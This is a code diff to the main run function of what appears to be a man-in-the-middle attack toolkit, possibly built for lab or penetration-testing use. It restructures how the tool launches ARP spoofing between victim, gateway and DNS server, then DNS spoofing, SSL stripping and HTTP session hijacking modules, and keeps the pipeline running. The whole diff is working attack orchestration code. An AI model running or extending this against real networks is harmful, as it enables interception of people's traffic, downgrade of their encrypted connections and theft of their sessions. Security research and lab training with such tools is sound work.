@@ -52,7 +52,7 @@ def run(mode: str):
     print(f"[INFO] Mode requested: {mode!r}")
 
     try:
-        # IP forwarding
+        # Enable IP forwarding
         if not enable_ip_forwarding():
             raise RuntimeError("IP forwarding could not be enabled!")
 
@@ -69,46 +69,78 @@ def run(mode: str):
         print(f"       domain   : {domain_name}")
         print(f"[INFO] Evidence/Audit directory: {audit_dir}")
 
-        # ARP Spoofing required for all attacks
-        if any(x in mode for x in ["arp", "dns", "ssl", "session"]):
-            dependents = []
-            if "dns" in mode:
-                dependents.append("dns_spoofing")
-            if "ssl" in mode:
-                dependents.append("ssl_stripping")
-            if "session" in mode:
-                dependents.append("http_session_hijacking")
-
-            print("[INFO] Starting ARP spoofing (MITM foundation)...")
+        # ARP SPOOFING
+        if mode == "arp":
+            # Demo mode -> show ARP control panel
+            print("[INFO] Starting ARP spoofing (DEMO mode)...")
             arp_spoofer = start_arp_spoof(
                 victim_ip,
                 gateway_ip,
                 attacker_iface,
                 audit_dir=audit_dir,
-                dependents=dependents,
+                dependents=[],
+                prerequisite_mode=False,
             )
             if not arp_spoofer:
                 raise RuntimeError("ARP Spoofer failed to start.")
             running_threads["arp"] = arp_spoofer
 
-        # DNS Spoofing
-        if "dns" in mode:
+        elif mode in {"dns", "ssl", "session"}:
+            # Prerequisite mode -> silent ARP MITM
+            print("[INFO] Starting ARP spoofing (prerequisite mode)...")
+            arp_spoofer = start_arp_spoof(
+                victim_ip,
+                gateway_ip,
+                attacker_iface,
+                audit_dir=audit_dir,
+                dependents=[mode],
+                prerequisite_mode=True,
+            )
+            if not arp_spoofer:
+                raise RuntimeError("ARP Spoofer failed to start.")
+            running_threads["arp"] = arp_spoofer
+        
+        if mode == "dns":
+            print("[INFO] Starting ARP spoofing (victim <-> DNS, prerequisite mode)...")
+            arp_dns = start_arp_spoof(
+                victim_ip,
+                config["dns"]["ip"],
+                attacker_iface,
+                audit_dir=audit_dir,
+                dependents=["dns"],
+                prerequisite_mode=True,
+            )
+            if not arp_dns:
+                raise RuntimeError("ARP Spoofer (DNS) failed to start.")
+            running_threads["arp_dns"] = arp_dns
+
+        # DNS SPOOFING
+        if mode == "dns":
             print("[INFO] Starting DNS spoofing module...")
-            dns_spoofer = DnsSpoofingAttack(domain=domain_name, fake_ip=attacker_ip)
+            dns_spoofer = DnsSpoofingAttack(
+                domain=domain_name,
+                fake_ip=attacker_ip,
+                victim_ip=victim_ip,
+                interface=attacker_iface,
+                dns_ip=config["dns"]["ip"],
+            )
             dns_spoofer.start()
             running_threads["dns"] = dns_spoofer
 
-        # SSL stripping
-        if "ssl" in mode:
+        # SSL STRIPPING
+        if mode == "ssl":
             print("[INFO] Starting SSL stripping module...")
-            real_server_ip = "10.0.0.53"
-            ssl_stripper = start_sslstrip(domain=domain_name, real_ip=real_server_ip)
+            real_server_ip = config["dns"]["ip"]
+            ssl_stripper = start_sslstrip(
+                domain=domain_name,
+                real_ip=real_server_ip,
+            )
             if not ssl_stripper:
                 raise RuntimeError("SSL Strip failed to start.")
             running_threads["ssl"] = ssl_stripper
 
-        # HTTP Session Hijacking
-        if "session" in mode:
+        # HTTP SESSION HIJACKING
+        if mode == "session":
             print("[INFO] Starting HTTP session hijacking module...")
             hijacker = HTTPSessionHijacker(
                 target_domain=domain_name,
@@ -117,13 +149,14 @@ def run(mode: str):
                 interface=attacker_iface,
             )
             hijacker.start()
-            
+
+            # GUI only if available
             if hijacker.gui:
                 hijacker.gui.mainloop()
 
             running_threads["session"] = hijacker
 
-        # Keep alive
+        # Keep Pipeline alives
         print(f"\n[INFO] MITM pipeline running: {list(running_threads.keys())}")
         print("[INFO] Press Ctrl+C to stop.\n")
 
